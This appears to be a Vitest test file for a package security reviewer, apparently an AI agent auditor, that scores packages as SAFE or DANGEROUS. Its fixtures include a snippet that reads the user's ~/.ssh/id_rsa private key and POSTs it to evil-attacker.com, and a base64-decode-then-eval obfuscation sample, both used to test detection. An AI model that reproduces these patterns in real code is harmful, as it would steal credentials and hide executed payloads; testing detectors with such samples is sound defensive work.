import { describe, it, expect } from 'vitest'
import {
  contextualSemanticReview,
  extractReviewContext,
  parseAgentResponse,
  DSH_SECURITY_STANDARDS,
  auditPackageWithAgent,
} from '../src/core/agent-reviewer.js'
import type { FileEntry } from '../src/core/types.js'

describe('agent-reviewer module', () => {
  it('exposes authoritative DSH security standards', () => {
    expect(DSH_SECURITY_STANDARDS.length).toBeGreaterThanOrEqual(5)
    expect(DSH_SECURITY_STANDARDS.some(s => s.id === 'STD-01-INTENT')).toBe(true)
    expect(DSH_SECURITY_STANDARDS.some(s => s.id === 'STD-02-CREDENTIALS')).toBe(true)
    expect(DSH_SECURITY_STANDARDS.some(s => s.id === 'STD-03-SUPPLY-CHAIN')).toBe(true)
  })

  it('accurately identifies package manager with child_process as SAFE via intent alignment', () => {
    const pkgJson = {
      name: 'dsh-m',
      version: '0.11.2',
      description: 'DSH package and plugin manager marketplace for plugins',
    }
    const files: FileEntry[] = [
      {
        relPath: 'src/index.ts',
        absPath: '/tmp/src/index.ts',
        content: `
          import { execFile } from 'node:child_process';
          export async function installPackage(name: string) {
            return execFile('npm', ['install', name]);
          }
        `,
      },
    ]

    const pkgInfo = extractReviewContext('dsh-m@0.11.2', files, pkgJson)
    const result = contextualSemanticReview('dsh-m@0.11.2', pkgInfo, files)

    expect(result.verdict).toBe('SAFE')
    expect(result.score).toBeGreaterThanOrEqual(85)
    expect(result.recommendation).toBe('APPROVE')
    expect(result.intentAnalysis).toContain('包管理器')
    expect(result.agentSummary).toContain('契合')
  })

  it('accurately flags credential theft as DANGEROUS and rejects', () => {
    const pkgJson = {
      name: 'fake-plugin',
      version: '1.0.0',
      description: 'Just a theme',
    }
    const files: FileEntry[] = [
      {
        relPath: 'src/index.ts',
        absPath: '/tmp/src/index.ts',
        content: `
          const fs = require('fs');
          const secret = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
          fetch('https://evil-attacker.com/steal', { method: 'POST', body: secret });
        `,
      },
    ]

    const pkgInfo = extractReviewContext('fake-plugin@1.0.0', files, pkgJson)
    const result = contextualSemanticReview('fake-plugin@1.0.0', pkgInfo, files)

    expect(result.verdict).toBe('DANGEROUS')
    expect(result.recommendation).toBe('REJECT')
    expect(result.score).toBeLessThanOrEqual(40)
    expect(result.findings.some(f => f.title.includes('敏感私钥'))).toBe(true)
  })

  it('accurately flags base64 eval obfuscation as DANGEROUS and rejects', () => {
    const pkgJson = {
      name: 'trojan-pkg',
      version: '1.0.0',
      description: 'Useful tool',
    }
    const files: FileEntry[] = [
      {
        relPath: 'payload.js',
        absPath: '/tmp/payload.js',
        content: `
          const code = Buffer.from('Y29uc29sZS5sb2coJ2hhY2tlZCcp', 'base64').toString();
          eval(Buffer.from(code));
        `,
      },
    ]

    const pkgInfo = extractReviewContext('trojan-pkg@1.0.0', files, pkgJson)
    const result = contextualSemanticReview('trojan-pkg@1.0.0', pkgInfo, files)

    expect(result.verdict).toBe('DANGEROUS')
    expect(result.recommendation).toBe('REJECT')
    expect(result.findings.some(f => f.title.includes('混淆代码'))).toBe(true)
  })

  it('parses raw and markdown fenced JSON responses reliably', () => {
    const markdownJson = `
Here is the review result:
\`\`\`json
{
  "verdict": "SAFE",
  "score": 98,
  "recommendation": "APPROVE",
  "intentAnalysis": "All clean",
  "agentSummary": "Approved",
  "findings": []
}
\`\`\`
Have a nice day!
    `
    const parsed = parseAgentResponse(markdownJson)
    expect(parsed.verdict).toBe('SAFE')
    expect(parsed.score).toBe(98)
    expect(parsed.recommendation).toBe('APPROVE')
  })
})
